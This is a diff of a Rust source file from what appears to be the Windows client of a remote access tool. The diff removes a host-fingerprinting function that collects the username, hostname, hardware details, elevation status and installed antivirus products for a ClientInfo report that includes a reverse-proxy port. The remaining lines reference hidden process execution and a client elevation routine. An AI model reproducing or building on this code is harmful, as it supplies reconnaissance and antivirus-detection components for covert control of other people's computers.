@@ -1,108 +1,15 @@
-use sysinfo::{ System, Disks };
-
 use std::ptr;
 use std::ptr::null_mut as NULL;
 use std::ffi::OsStr;
 use std::os::windows::{process::CommandExt, ffi::OsStrExt};
 
 use winapi::um::{shellapi::ShellExecuteW, winuser};
-use winapi::um::winuser::{ SW_HIDE, EnumDisplayMonitors };
-use winapi::shared::winerror::{ S_OK, DXGI_ERROR_NOT_FOUND };
-use winapi::shared::dxgi::{ CreateDXGIFactory, IDXGIFactory, IDXGIAdapter };
+use winapi::um::winuser::SW_HIDE;
 use winapi::shared::minwindef::UINT;
-use winapi::shared::windef::{ HMONITOR, HDC, RECT };
-use winapi::shared::minwindef::{ BOOL, LPARAM };
-use winapi::Interface;
 
 use crate::service::install::is_elevated;
-use crate::features::av_detection::get_installed_avs;
-use common::packets::{MessageBoxData, VisitWebsiteData, ClientInfo};
+use common::packets::{MessageBoxData, VisitWebsiteData};
 
-
-pub fn client_info(group: String) -> ClientInfo{
-    let mut s = System::new_all();
-
-    let mut storage = Vec::new();
-
-    let disks = Disks::new_with_refreshed_list();
-    for disk in disks.list() {
-        storage.push(
-            format!(
-                "{} {} {}",
-                disk.name().to_string_lossy(),
-                convert_bytes(disk.available_space() as f64),
-                disk.kind()
-            )
-        );
-    }
-
-    let mut gpus = Vec::new();
-
-    unsafe {
-        let mut factory: *mut IDXGIFactory = std::ptr::null_mut();
-        let hr = CreateDXGIFactory(&IDXGIFactory::uuidof(), &mut factory as *mut _ as *mut _);
-
-        if hr != S_OK {
-            eprintln!("Failed to create DXGI Factory");
-        }
-
-        let mut i = 0;
-        loop {
-            let mut adapter: *mut IDXGIAdapter = std::ptr::null_mut();
-            if (*factory).EnumAdapters(i, &mut adapter) == DXGI_ERROR_NOT_FOUND {
-                break;
-            }
-
-            let mut desc = std::mem::zeroed();
-            (*adapter).GetDesc(&mut desc);
-
-            let adapter_description = String::from_utf16_lossy(&desc.Description);
-
-            gpus.push(adapter_description.trim_end_matches(char::from(0)).to_string());
-
-            i += 1;
-        }
-    }
-
-    let mut display_count = 0;
-
-    unsafe {
-        EnumDisplayMonitors(
-            ptr::null_mut(),
-            ptr::null_mut(),
-            Some(monitor_enum_proc),
-            &mut display_count as *mut _ as LPARAM
-        );
-    }
-
-    std::thread::sleep(sysinfo::MINIMUM_CPU_UPDATE_INTERVAL);
-    s.refresh_cpu_all();
-
-    let installed_avs = get_installed_avs();
-    
-    // No blocking calls in this function - we'll fetch location asynchronously later if needed
-
-    let client_data = ClientInfo {
-        uuidv4: None,
-        addr: None,
-        group,
-        username: std::env::var("username").unwrap_or_else(|_| "__UNKNOWN__".to_string()),
-        hostname: System::host_name().unwrap().to_string(),
-        os: format!("{} {}", System::name().unwrap(), System::os_version().unwrap()),
-        ram: convert_bytes(s.total_memory() as f64),
-        cpu: s.cpus()[0].brand().to_string().clone(),
-        gpus: gpus.clone(),
-        storage: storage.clone(),
-        displays: display_count,
-        is_elevated: is_elevated(),
-        reverse_proxy_port: "".to_string(),
-        installed_avs,
-        disconnected: None,
-        country_code: "N/A".to_string(),
-    };
-
-    client_data
-}
 
 pub fn visit_website(
     visit_data: &VisitWebsiteData
@@ -188,38 +95,4 @@ pub fn elevate_client() {
             crate::MUTEX_SERVICE.lock().unwrap().lock();
         }
     }
-}
-
-const SUFFIX: [&str; 9] = ["B", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB"];
-
-pub fn convert_bytes<T: Into<f64>>(size: T) -> String {
-    let size = size.into();
-
-    if size <= 0.0 {
-        return "0 B".to_string();
-    }
-
-    let base = size.log10() / (1024_f64).log10();
-
-    let mut result = (((1024_f64).powf(base - base.floor()) * 10.0).round() / 10.0).to_string();
-
-    result.push(' ');
-    result.push_str(SUFFIX[base.floor() as usize]);
-
-    result
-}
-
-unsafe extern "system" fn monitor_enum_proc(
-    _h_monitor: HMONITOR,
-    _hdc_monitor: HDC,
-    _lprc_monitor: *mut RECT,
-    lparam: LPARAM
-) -> BOOL {
-    // Cast lparam to *mut usize and increment the counter
-    let count_ptr = lparam as *mut usize;
-    // Ensure proper alignment before dereferencing
-    if count_ptr as usize % std::mem::align_of::<usize>() == 0 {
-        *count_ptr += 1;
-    }
-    1
 }
